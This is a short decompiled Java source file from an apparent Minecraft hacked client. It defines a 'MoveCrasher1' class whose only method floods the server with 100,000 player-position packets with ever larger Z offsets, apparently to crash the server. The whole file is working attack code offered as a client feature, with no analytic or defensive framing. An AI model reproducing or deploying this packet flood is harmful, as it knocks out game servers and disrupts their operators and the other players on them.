// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.mc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class MoveCrasher1
{
    public static void start() {
        final double x = Minecraft.getMinecraft().player.posX;
        final double y = Minecraft.getMinecraft().player.posY;
        final double z = Minecraft.getMinecraft().player.posZ;
        double d1 = 0.0;
        for (int i2 = 0; i2 < 10; ++i2) {
            for (int i3 = 0; i3 < 10000; ++i3) {
                d1 = i3 * 9;
                Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(x, y, z + d1, false));
            }
        }
    }
}
